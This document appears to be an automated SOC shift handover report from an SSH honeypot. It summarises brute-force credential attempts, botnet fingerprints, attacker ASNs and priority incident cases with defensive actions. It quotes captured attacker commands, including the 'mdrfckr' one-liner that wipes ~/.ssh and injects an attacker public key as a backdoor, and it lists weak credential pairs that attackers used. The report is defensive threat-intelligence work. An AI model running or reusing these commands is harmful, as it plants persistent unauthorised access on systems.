# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-17 |
| **Generated At** | 2026-08-17T07:03:42Z |
| **Shift Time** | 07:03 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **6991** |
| Confirmed Threats | **6879** |
| False Positives Filtered | **112** (1.6%) |
| Unique Attacker IPs | **127** |
| Countries of Origin | **40** |
| High Severity Cases | **155** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **6836** |
| Malware Samples Analyzed | **2** HIGH · **23** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **193** |
| Unique Credential Pairs | **119** |
| Unique Usernames | **33** |
| Unique Passwords | **105** |
| Successful Auth Pairs | **169** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 83 |
| `user` | 28 |
| `support` | 18 |
| `admin` | 11 |
| `centos` | 8 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `support` | 14 |
| `maintenance` | 11 |
| `techsupport` | 7 |
| `root` | 6 |
| `webadmin` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 8 |
| `user` | `maintenance` | 6 |
| `root` | `support` | 6 |
| `admin` | `webadmin` | 5 |
| `root` | `maintenance` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `user` | `ubuntu` | `10.0.0.73` | 2026-08-17T02:55:10 |
| `support` | `support` | `10.0.0.73` | 2026-08-17T02:56:32 |
| `user` | `ubuntu` | `1.212.225.99` | 2026-08-17T02:56:42 |
| `user` | `ubuntu` | `41.42.10.251` | 2026-08-17T02:56:50 |
| `admin` | `qwerty123456` | `121.189.226.81` | 2026-08-17T02:57:36 |
| `admin` | `qwerty123456` | `220.189.209.18` | 2026-08-17T02:57:47 |
| `root` | `q1w2e3r4` | `92.255.196.185` | 2026-08-17T02:59:20 |
| `root` | `q1w2e3r4` | `223.197.166.78` | 2026-08-17T02:59:35 |
| `gpadmin` | `Abc123` | `217.165.22.192` | 2026-08-17T03:05:43 |
| `root` | `terra` | `51.81.84.41` | 2026-08-17T03:06:12 |
| `345gs5662d34` | `345gs5662d34` | `51.81.84.41` | 2026-08-17T03:06:13 |
| `root` | `3245gs5662d34` | `51.81.84.41` | 2026-08-17T03:06:13 |
| `cs2server` | `123` | `101.47.156.21` | 2026-08-17T03:07:20 |
| `345gs5662d34` | `345gs5662d34` | `101.47.156.21` | 2026-08-17T03:07:24 |
| `cs2server` | `3245gs5662d34` | `101.47.156.21` | 2026-08-17T03:07:26 |
| `root` | `Qwerty78` | `14.46.87.209` | 2026-08-17T03:08:01 |
| `345gs5662d34` | `345gs5662d34` | `14.46.87.209` | 2026-08-17T03:08:04 |
| `root` | `3245gs5662d34` | `14.46.87.209` | 2026-08-17T03:08:06 |
| `admin` | `qwerty123456` | `10.0.0.73` | 2026-08-17T03:09:03 |
| `user` | `maintenance` | `10.0.0.73` | 2026-08-17T03:14:28 |
| `kafka` | `p@ssw0rd` | `217.165.22.192` | 2026-08-17T03:24:49 |
| `admin` | `qwerty123456` | `220.246.42.227` | 2026-08-17T03:26:10 |
| `support` | `111` | `117.241.77.78` | 2026-08-17T03:31:09 |
| `support` | `111` | `153.37.177.219` | 2026-08-17T03:31:21 |
| `user` | `maintenance` | `46.101.9.55` | 2026-08-17T03:32:30 |
| `user` | `maintenance` | `117.39.63.46` | 2026-08-17T03:32:40 |
| `user` | `maintenance` | `187.126.105.42` | 2026-08-17T03:32:50 |
| `user` | `maintenance` | `60.173.105.206` | 2026-08-17T03:33:02 |
| `support` | `support` | `176.53.159.196` | 2026-08-17T03:36:21 |
| `support` | `111` | `10.0.0.73` | 2026-08-17T03:42:29 |
| `dell` | `Abc1234` | `217.165.22.192` | 2026-08-17T03:43:55 |
| `admin` | `webadmin` | `10.0.0.73` | 2026-08-17T03:47:37 |
| `root` | `support` | `10.0.0.73` | 2026-08-17T03:59:02 |
| `root` | `support` | `178.178.194.192` | 2026-08-17T04:00:37 |
| `root` | `support` | `102.211.7.162` | 2026-08-17T04:00:44 |
| `ftp_user` | `password1!` | `217.165.22.192` | 2026-08-17T04:03:01 |
| `admin` | `webadmin` | `120.194.50.39` | 2026-08-17T04:05:55 |
| `admin` | `webadmin` | `188.168.86.6` | 2026-08-17T04:06:04 |
| `admin` | `webadmin` | `111.70.32.11` | 2026-08-17T04:06:10 |
| `debian` | `0987654321` | `10.0.0.73` | 2026-08-17T04:16:12 |
| `root` | `support` | `59.48.40.6` | 2026-08-17T04:16:48 |
| `root` | `support` | `220.246.66.209` | 2026-08-17T04:17:03 |
| `user` | `qwer1234` | `10.0.0.73` | 2026-08-17T04:21:50 |
| `ps` | `ps1234` | `217.165.22.192` | 2026-08-17T04:22:08 |
| `centos` | `administrator` | `62.201.212.54` | 2026-08-17T04:39:25 |
| `user` | `qwer1234` | `113.158.205.225` | 2026-08-17T04:41:04 |
| `demo` | `123` | `217.165.22.192` | 2026-08-17T04:41:14 |
| `user` | `qwer1234` | `213.33.204.130` | 2026-08-17T04:41:16 |
| `support` | `159753` | `213.55.79.195` | 2026-08-17T04:52:21 |
| `support` | `159753` | `178.216.165.187` | 2026-08-17T04:52:29 |
| `ftpuser` | `123` | `217.165.22.192` | 2026-08-17T05:00:23 |
| `centos` | `administrator` | `49.124.153.23` | 2026-08-17T05:09:33 |
| `Support` | `666666666` | `10.0.0.73` | 2026-08-17T05:09:38 |
| `centos` | `administrator` | `65.20.161.126` | 2026-08-17T05:09:42 |
| `admin` | `admin` | `10.0.0.73` | 2026-08-17T05:11:49 |
| `root` | `123@@@` | `144.22.238.238` | 2026-08-17T05:15:00 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-08-17T05:15:02 |
| `root` | `maintenance` | `138.118.213.68` | 2026-08-17T05:15:06 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-08-17T05:15:07 |
| `user` | `123654` | `45.178.227.0` | 2026-08-17T05:16:41 |
| `user` | `123654` | `82.102.188.117` | 2026-08-17T05:16:50 |
| `user` | `123654` | `218.58.73.238` | 2026-08-17T05:16:50 |
| `dspace` | `dspace1234` | `217.165.22.192` | 2026-08-17T05:19:29 |
| `root` | `maintenance` | `10.0.0.73` | 2026-08-17T05:26:49 |
| `centos` | `987654321` | `10.0.0.73` | 2026-08-17T05:32:27 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.62.174.198` | 2026-08-17T05:35:44 |
| `*1` | `$4` | `34.62.174.198` | 2026-08-17T05:35:52 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 9500` | `34.62.174.198` | 2026-08-17T05:35:54 |
| `user2` | `password1!` | `217.165.22.192` | 2026-08-17T05:38:35 |
| `user` | `121212` | `10.0.0.73` | 2026-08-17T05:43:58 |
| `root` | `maintenance` | `36.137.38.119` | 2026-08-17T05:44:03 |
| `root` | `maintenance` | `65.20.217.64` | 2026-08-17T05:44:12 |
| `user` | `121212` | `182.78.240.94` | 2026-08-17T05:45:34 |
| `user` | `121212` | `178.178.222.53` | 2026-08-17T05:45:44 |
| `blank` | `techsupport` | `178.178.194.137` | 2026-08-17T05:49:04 |
| `centos` | `987654321` | `65.20.134.97` | 2026-08-17T05:50:33 |
| `centos` | `987654321` | `103.121.27.218` | 2026-08-17T05:50:47 |
| `centos` | `987654321` | `186.215.107.189` | 2026-08-17T05:50:58 |
| `user` | `Abc1234` | `217.165.22.192` | 2026-08-17T05:57:41 |
| `blank` | `techsupport` | `10.0.0.73` | 2026-08-17T06:00:41 |
| `support` | `logon` | `10.0.0.73` | 2026-08-17T06:06:05 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `104.199.87.85` | 2026-08-17T06:16:37 |
| `filmlight` | `123.com` | `217.165.22.192` | 2026-08-17T06:16:47 |
| `*1` | `$4` | `104.199.87.85` | 2026-08-17T06:16:51 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 8671` | `104.199.87.85` | 2026-08-17T06:16:53 |
| `blank` | `techsupport` | `81.214.75.248` | 2026-08-17T06:17:43 |
| `nobody` | `root` | `10.0.0.73` | 2026-08-17T06:17:45 |
| `blank` | `techsupport` | `65.20.198.159` | 2026-08-17T06:17:55 |
| `nobody` | `root` | `197.155.225.93` | 2026-08-17T06:19:15 |
| `nobody` | `root` | `196.189.126.10` | 2026-08-17T06:19:22 |
| `user` | `qwerty12345` | `124.239.169.52` | 2026-08-17T06:22:59 |
| `support` | `logon` | `120.224.15.67` | 2026-08-17T06:24:22 |
| `support` | `logon` | `123.52.202.92` | 2026-08-17T06:24:34 |
| `support` | `logon` | `180.248.52.207` | 2026-08-17T06:24:36 |
| `user` | `qwerty12345` | `10.0.0.73` | 2026-08-17T06:34:25 |
| `gpadmin` | `Abc1234` | `217.165.22.192` | 2026-08-17T06:35:53 |
| `user` | `techsupport` | `10.0.0.73` | 2026-08-17T06:39:45 |
| `root` | `09N1RCa1Hs31` | `85.158.145.129` | 2026-08-17T06:44:16 |
| `dixi` | `09N1RCa1Hs31` | `85.158.145.129` | 2026-08-17T06:44:26 |
| `root` | `rootroot` | `85.158.145.129` | 2026-08-17T06:44:35 |
| `root` | `pw1234` | `85.158.145.129` | 2026-08-17T06:44:45 |
| `root` | `` | `94.154.43.210` | 2026-08-17T06:44:50 |
| `root` | `!123456` | `85.158.145.129` | 2026-08-17T06:44:55 |
| `root` | `12345x` | `85.158.145.129` | 2026-08-17T06:45:24 |
| `root` | `Pa22word` | `85.158.145.129` | 2026-08-17T06:45:34 |
| `root` | `pa22word` | `85.158.145.129` | 2026-08-17T06:45:44 |
| `ubuntu` | `progres` | `85.158.145.129` | 2026-08-17T06:45:54 |
| `root` | `!QAZ@WSX3e` | `85.158.145.129` | 2026-08-17T06:46:03 |
| `root` | `@!qwe123` | `85.158.145.129` | 2026-08-17T06:46:13 |
| `root` | `Admin!@#` | `85.158.145.129` | 2026-08-17T06:46:23 |
| `root` | `P@$$W0RD` | `85.158.145.129` | 2026-08-17T06:46:33 |
| `root` | `P@$$w0rd` | `85.158.145.129` | 2026-08-17T06:46:43 |
| `root` | `P@55w0rd` | `85.158.145.129` | 2026-08-17T06:46:53 |
| `root` | `P@55w0rd!` | `85.158.145.129` | 2026-08-17T06:47:02 |
| `root` | `P@55word` | `85.158.145.129` | 2026-08-17T06:47:12 |
| `root` | `P@ssw0rd!` | `85.158.145.129` | 2026-08-17T06:47:22 |
| `root` | `P@ssw0rd` | `85.158.145.129` | 2026-08-17T06:47:32 |
| `root` | `P@ssword` | `85.158.145.129` | 2026-08-17T06:47:42 |
| `root` | `P@ssword!0` | `85.158.145.129` | 2026-08-17T06:47:51 |
| `root` | `P@ssword1` | `85.158.145.129` | 2026-08-17T06:48:01 |
| `root` | `P@ssword12` | `85.158.145.129` | 2026-08-17T06:48:11 |
| `root` | `P@ssword123` | `85.158.145.129` | 2026-08-17T06:48:21 |
| `root` | `P@ssword1234` | `85.158.145.129` | 2026-08-17T06:48:30 |
| `root` | `P@ssword12345` | `85.158.145.129` | 2026-08-17T06:48:40 |
| `root` | `P@ssword123456` | `85.158.145.129` | 2026-08-17T06:48:50 |
| `temp` | `temp` | `85.158.145.129` | 2026-08-17T06:49:00 |
| `root` | `orangepi` | `85.158.145.129` | 2026-08-17T06:49:10 |
| `pi` | `pi` | `85.158.145.129` | 2026-08-17T06:49:19 |
| `root` | `rasberry` | `85.158.145.129` | 2026-08-17T06:49:29 |
| `pi` | `raspberry` | `85.158.145.129` | 2026-08-17T06:49:39 |
| `root` | `root@123` | `85.158.145.129` | 2026-08-17T06:49:49 |
| `root` | `root@1234` | `85.158.145.129` | 2026-08-17T06:49:59 |
| `root` | `root@12345` | `85.158.145.129` | 2026-08-17T06:50:08 |
| `root` | `root@123456` | `85.158.145.129` | 2026-08-17T06:50:18 |
| `root` | `root1234` | `85.158.145.129` | 2026-08-17T06:50:28 |
| `root` | `root1` | `85.158.145.129` | 2026-08-17T06:50:38 |
| `root` | `root12` | `85.158.145.129` | 2026-08-17T06:50:47 |
| `root` | `root123` | `85.158.145.129` | 2026-08-17T06:50:57 |
| `root` | `root12345` | `85.158.145.129` | 2026-08-17T06:51:07 |
| `root` | `root123456` | `85.158.145.129` | 2026-08-17T06:51:17 |
| `root` | `admin` | `36.89.252.58` | 2026-08-17T06:51:26 |
| `user` | `qwerty12345` | `82.65.140.218` | 2026-08-17T06:51:26 |
| `root` | `root1234567` | `85.158.145.129` | 2026-08-17T06:51:27 |
| `user` | `qwerty12345` | `74.208.177.56` | 2026-08-17T06:51:33 |
| `root` | `root12345678` | `85.158.145.129` | 2026-08-17T06:51:36 |
| `root` | `root123456789` | `85.158.145.129` | 2026-08-17T06:51:46 |
| `root` | `root!@123` | `85.158.145.129` | 2026-08-17T06:51:56 |
| `root` | `root!@#123` | `85.158.145.129` | 2026-08-17T06:52:06 |
| `caja01` | `caja01` | `85.158.145.129` | 2026-08-17T06:52:16 |
| `caja1` | `caja1` | `85.158.145.129` | 2026-08-17T06:52:25 |
| `caja` | `caja` | `85.158.145.129` | 2026-08-17T06:52:35 |
| `root` | `PASS1` | `85.158.145.129` | 2026-08-17T06:52:45 |
| `config` | `123456` | `87.103.126.54` | 2026-08-17T06:52:47 |
| `root` | `PASS!` | `85.158.145.129` | 2026-08-17T06:52:55 |
| `config` | `123456` | `110.227.215.90` | 2026-08-17T06:52:57 |
| `root` | `PASS` | `85.158.145.129` | 2026-08-17T06:53:04 |
| `root` | `PASSWORD` | `85.158.145.129` | 2026-08-17T06:53:14 |
| `root` | `PASSWD` | `85.158.145.129` | 2026-08-17T06:53:24 |
| `root` | `PASSW0RD` | `85.158.145.129` | 2026-08-17T06:53:34 |
| `root` | `Parasol1` | `85.158.145.129` | 2026-08-17T06:53:44 |
| `root` | `Pass1` | `85.158.145.129` | 2026-08-17T06:53:53 |
| `root` | `Pass12` | `85.158.145.129` | 2026-08-17T06:54:03 |
| `root` | `Pass123` | `85.158.145.129` | 2026-08-17T06:54:13 |
| `root` | `Pass12345` | `85.158.145.129` | 2026-08-17T06:54:23 |
| `root` | `Pass1234` | `85.158.145.129` | 2026-08-17T06:54:33 |
| `root` | `Pass123456` | `85.158.145.129` | 2026-08-17T06:54:42 |
| `root` | `Pass1234567` | `85.158.145.129` | 2026-08-17T06:54:52 |
| `weblogic` | `password1!` | `217.165.22.192` | 2026-08-17T06:54:59 |
| `root` | `Pass12345678` | `85.158.145.129` | 2026-08-17T06:55:02 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **6991** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 89 |
| OpenSSH | 57 |
| libssh | 10 |
| Paramiko (Python) | 4 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `98f63c4d9c87...` | Generic scanner | 67 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 55 | 54 |
| `e45f2d6d7f79...` | Mirai/variant | 13 | 1 |
| `f555226df196...` | Mirai/variant | 9 | 3 |
| `eff4c24daffc...` | Modern SSH client | 4 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `98f63c4d9c87...` | Go SSH scanner | 67 | 1 | Generic scanner |
| `acaa53e0a7d7...` | OpenSSH | 55 | 54 | Mirai/variant |
| `e45f2d6d7f79...` | Go SSH scanner | 13 | 1 | Mirai/variant |
| `f555226df196...` | libssh | 9 | 3 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 4 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 4 | 1 | Mirai/variant |
| `e54ef3ec27fe...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `873a5fb5fedc...` | Go SSH scanner | 2 | 2 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `94.154.43.210`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `101.47.156.21`, `51.81.84.41`, `14.46.87.209`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **127** |
| Unique ASNs | **87** |
| High-Risk ASNs | **68** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 10 | HIGH |
| `AS396982` | Google LLC | 6 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 4 | HIGH |
| `AS199195` | ANOTHER CALPE CONSULTING CONCEPT S.L. | 3 | LOW |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |
| `AS4766` | Korea Telecom | 3 | HIGH |
| `AS4760` | HKT Limited | 3 | HIGH |
| `AS7713` | PT Telekomunikasi Indonesia | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (90)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-3882ec23cd61

| Field | Detail |
|---|---|
| **Source IP** | `1.212.225[.]99` |
| **First Seen** | 2026-08-17 02:56 |
| **Last Seen** | 2026-08-17 02:56 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 02:56:39` | `cowrie.session.connect` |
| `2026-08-17 02:56:40` | `cowrie.client.version` |
| `2026-08-17 02:56:40` | `cowrie.client.kex` |
| `2026-08-17 02:56:42` | `cowrie.login.success` |
| `2026-08-17 02:56:43` | `cowrie.direct-tcpip.request` |
| `2026-08-17 02:56:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.212.225[.]99` to AbuseIPDB if not already reported
- [ ] Block `1.212.225[.]99` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7802522a44d

| Field | Detail |
|---|---|
| **Source IP** | `41.42.10[.]251` |
| **First Seen** | 2026-08-17 02:56 |
| **Last Seen** | 2026-08-17 02:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 02:56:48` | `cowrie.session.connect` |
| `2026-08-17 02:56:49` | `cowrie.client.version` |
| `2026-08-17 02:56:49` | `cowrie.client.kex` |
| `2026-08-17 02:56:50` | `cowrie.login.success` |
| `2026-08-17 02:56:50` | `cowrie.direct-tcpip.request` |
| `2026-08-17 02:56:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.42.10[.]251` to AbuseIPDB if not already reported
- [ ] Block `41.42.10[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bb2373d4481

| Field | Detail |
|---|---|
| **Source IP** | `121.189.226[.]81` |
| **First Seen** | 2026-08-17 02:57 |
| **Last Seen** | 2026-08-17 02:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 02:57:33` | `cowrie.session.connect` |
| `2026-08-17 02:57:34` | `cowrie.client.version` |
| `2026-08-17 02:57:34` | `cowrie.client.kex` |
| `2026-08-17 02:57:36` | `cowrie.login.success` |
| `2026-08-17 02:57:36` | `cowrie.direct-tcpip.request` |
| `2026-08-17 02:57:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.189.226[.]81` to AbuseIPDB if not already reported
- [ ] Block `121.189.226[.]81` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e2c6c05ede8

| Field | Detail |
|---|---|
| **Source IP** | `220.189.209[.]18` |
| **First Seen** | 2026-08-17 02:57 |
| **Last Seen** | 2026-08-17 02:57 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 02:57:43` | `cowrie.session.connect` |
| `2026-08-17 02:57:45` | `cowrie.client.version` |
| `2026-08-17 02:57:45` | `cowrie.client.kex` |
| `2026-08-17 02:57:47` | `cowrie.login.success` |
| `2026-08-17 02:57:48` | `cowrie.direct-tcpip.request` |
| `2026-08-17 02:57:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.189.209[.]18` to AbuseIPDB if not already reported
- [ ] Block `220.189.209[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7814023b8606

| Field | Detail |
|---|---|
| **Source IP** | `92.255.196[.]185` |
| **First Seen** | 2026-08-17 02:59 |
| **Last Seen** | 2026-08-17 02:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 02:59:19` | `cowrie.session.connect` |
| `2026-08-17 02:59:19` | `cowrie.client.version` |
| `2026-08-17 02:59:19` | `cowrie.client.kex` |
| `2026-08-17 02:59:20` | `cowrie.login.success` |
| `2026-08-17 02:59:21` | `cowrie.direct-tcpip.request` |
| `2026-08-17 02:59:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.255.196[.]185` to AbuseIPDB if not already reported
- [ ] Block `92.255.196[.]185` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e215d7840c77

| Field | Detail |
|---|---|
| **Source IP** | `223.197.166[.]78` |
| **First Seen** | 2026-08-17 02:59 |
| **Last Seen** | 2026-08-17 02:59 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 02:59:27` | `cowrie.session.connect` |
| `2026-08-17 02:59:28` | `cowrie.client.version` |
| `2026-08-17 02:59:28` | `cowrie.client.kex` |
| `2026-08-17 02:59:35` | `cowrie.login.success` |
| `2026-08-17 02:59:36` | `cowrie.direct-tcpip.request` |
| `2026-08-17 02:59:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.166[.]78` to AbuseIPDB if not already reported
- [ ] Block `223.197.166[.]78` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bbec6ba8840

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-17 03:05 |
| **Last Seen** | 2026-08-17 03:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 03:05:42` | `cowrie.session.connect` |
| `2026-08-17 03:05:42` | `cowrie.client.version` |
| `2026-08-17 03:05:42` | `cowrie.client.kex` |
| `2026-08-17 03:05:43` | `cowrie.login.success` |
| `2026-08-17 03:05:44` | `cowrie.session.params` |
| `2026-08-17 03:05:44` | `cowrie.command.input` |
| `2026-08-17 03:05:44` | `cowrie.log.closed` |
| `2026-08-17 03:05:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7d6e241be2c

| Field | Detail |
|---|---|
| **Source IP** | `51.81.84[.]41` |
| **First Seen** | 2026-08-17 03:06 |
| **Last Seen** | 2026-08-17 03:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 03:06:12` | `cowrie.session.connect` |
| `2026-08-17 03:06:12` | `cowrie.client.version` |
| `2026-08-17 03:06:12` | `cowrie.client.kex` |
| `2026-08-17 03:06:12` | `cowrie.login.success` |
| `2026-08-17 03:06:12` | `cowrie.session.params` |
| `2026-08-17 03:06:12` | `cowrie.command.input` |
| `2026-08-17 03:06:12` | `cowrie.command.failed` |
| `2026-08-17 03:06:12` | `cowrie.log.closed` |
| `2026-08-17 03:06:13` | `cowrie.session.params` |
| `2026-08-17 03:06:13` | `cowrie.command.input` |
| `2026-08-17 03:06:13` | `cowrie.session.file_download` |
| `2026-08-17 03:06:13` | `cowrie.log.closed` |
| `2026-08-17 03:06:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.81.84[.]41` to AbuseIPDB if not already reported
- [ ] Block `51.81.84[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
